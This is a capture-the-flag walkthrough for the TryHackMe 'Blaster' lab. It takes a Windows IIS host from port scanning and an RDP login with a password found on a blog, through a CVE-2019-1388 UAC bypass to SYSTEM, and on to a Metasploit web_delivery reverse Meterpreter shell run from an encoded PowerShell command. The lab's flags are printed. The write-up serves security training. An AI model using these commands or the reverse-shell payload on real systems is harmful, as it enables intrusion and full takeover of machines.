# Walktrough : TryHackMe - Blaster
Target IP: ```10.49.161.42 / 10.48.191.50```
Attacker IP: ```192.168.135.130```
Initial Access User: ```wade```
Elevated Access: ```NT AUTHORITY\SYSTEM```

## Phase 1: Reconnaissance & Enumeration
1. Network Port Scanning
- Command Executed:
```bash
nmap -sV -sC 10.49.161.42 -Pn
```
- Results: Revealed two open services:
  - Port 80/tcp: Microsoft IIS httpd 10.0
  - Port 3389/tcp: Microsoft Terminal Services (RDP) on domain ```RETROWEB```

2. Directory Fuzzing
- Command Executed:
```bash
gobuster dir -u http://10.49.161.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
- Results: Discovered hidden web path ```/retro``` (Status 301).

3. Web Application Reconnaissance & Credential Harvest
- Findings:
  - Navigated to ```[http://10.49.161.42/retro/](http://10.49.161.42/retro/)``` which exposed the "Retro Fanatics" blog.
  - Identified the blog author as user ```Wade```.
  - Located a comment posted by ```Wade``` on the "Ready Player One" post containing the potential password: ```parzival```.

## Phase 2: Initial Access & User Flag Retrieval
Establish an RDP session using harvested credentials to acquire standard user access.
- RDP Connection:
```bash
xfreerdp /u:wade /p:parzival /v:10.48.191.50
```
- User Flag Retrieval:
  - Opened ```C:\Users\wade\Desktop\user.txt``` via Notepad.
  - User Flag: ```THM{HACK_PLAYER_ONE}```

## Phase 3: Privilege Escalation (CVE-2019-1388)
Exploit an unpatched Windows User Account Control vulnerability via signed executables (```hhupd.exe```) to spawn an elevated shell.
1. Trigger Elevation Prompt: Executed ```C:\Users\Wade\Desktop\hhupd.exe``` to bring up the UAC prompt.
2. Inspect Publisher Certificate: Clicked "Show information about the publisher's certificate" to view details for ```VeriSign Commercial Software Publishers CA```.
3. Invoke Elevated Browser Context: Clicked the issuer URL inside the certificate window to launch Internet Explorer with elevated permissions.
4. Browse System Directory: Opened the file picker via ```File -> Save as...``` and navigated to ```c:\windows\system32\*.*```.
5. Spawn SYSTEM Command Shell: Located ```cmd.exe```, right-clicked, and opened it directly to gain interactive access.

- Privilege Verification:
```bash
C:\Windows\System32> whoami
nt authority\system
```
6. Administrator Flag Retrieval:
```bash
type C:\Users\Administrator\Desktop\root.txt
```
Root Flag: ```THM{COIN_OPERATED_EXPLOITATION}```

## Phase 4: Metasploit Payload Delivery (web_delivery)
Establish a persistent reverse Meterpreter session back to the handler.
1. Configure Metasploit Module:
```bash
msfconsole
use exploit/multi/script/web_delivery
set LHOST 192.168.135.130
set SRVPORT 1234
set target 2
set payload windows/meterpreter/reverse_http
run
```
2. Execute Encoded Payload on Target:
Executed the generated Base64 PowerShell command inside the elevated shell:
```bash
powershell.exe -nop -w hidden -e WwBPTk...[REDACTED]...==
```
3. Verify Interactive Meterpreter Session:
```bash
msf exploit(multi/script/web_delivery) > sessions

Active sessions
================

Id  Name  Type                     Information                     Connection
--  ----  ----                     -----------                     ----------
1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ RETROWEB  192.168.135.130:8080 -> 10.48.191.50:50169

msf exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > ls C:\Users\Administrator\Desktop
Listing: C:\Users\Administrator\Desktop
=======================================
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-12-09 02:10:15 -0500  desktop.ini
100666/rw-rw-rw-  31    fil   2020-04-23 13:34:00 -0400  root.txt
```
